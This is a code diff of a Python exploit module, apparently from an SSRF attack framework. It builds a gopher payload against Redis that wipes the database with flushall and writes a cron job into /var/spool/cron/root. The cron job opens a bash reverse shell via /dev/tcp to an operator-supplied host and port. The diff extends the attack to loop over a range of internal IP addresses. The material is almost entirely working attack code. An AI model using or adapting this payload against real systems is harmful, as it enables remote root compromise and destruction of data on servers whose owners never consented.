@@ -10,26 +10,33 @@ documentation = [
     ]
 
 class exploit():
+    SERVER_HOST = "127.0.0.1"
+    SERVER_PORT = "4242"
 
     def __init__(self, requester, args):
         logging.info("Module '{}' launched !".format(name))
 
-        # Data for the service
-        ip   = "127.0.0.1"
-        port = "6379"
-        data = "*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/SERVER_HOST/SERVER_PORT%200>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a"
-        
-        payload = wrapper_gopher(data, ip , port)
-
         # Handle args for reverse shell
-        if args.lhost == None: payload = payload.replace("SERVER_HOST", input("Server Host:"))
-        else:                  payload = payload.replace("SERVER_HOST", args.lhost)
+        if args.lhost == None: self.SERVER_HOST = input("Server Host:")
+        else:                  self.SERVER_HOST = args.lhost
 
-        if args.lport == None: payload = payload.replace("SERVER_PORT", input("Server Port:"))
-        else:                  payload = payload.replace("SERVER_PORT", args.lport)
+        if args.lport == None: self.SERVER_PORT = input("Server Port:")
+        else:                  self.SERVER_PORT = args.lport
 
-        # Send the payload
-        r = requester.do_request(args.param, payload)
+        # Data for the service
+        # Using a generator to create the host list
+        gen_host = gen_ip_list("127.0.0.1", args.level)
+        for ip in gen_host:
+            port = "6379"
+            data = "*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/SERVER_HOST/SERVER_PORT%200>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a"
+            payload = wrapper_gopher(data, ip , port)
+
+            # Handle args for reverse shell
+            payload = payload.replace("SERVER_HOST", self.SERVER_HOST)
+            payload = payload.replace("SERVER_PORT", self.SERVER_PORT)
+
+            # Send the payload
+            r = requester.do_request(args.param, payload)
 
 """
 TODO:
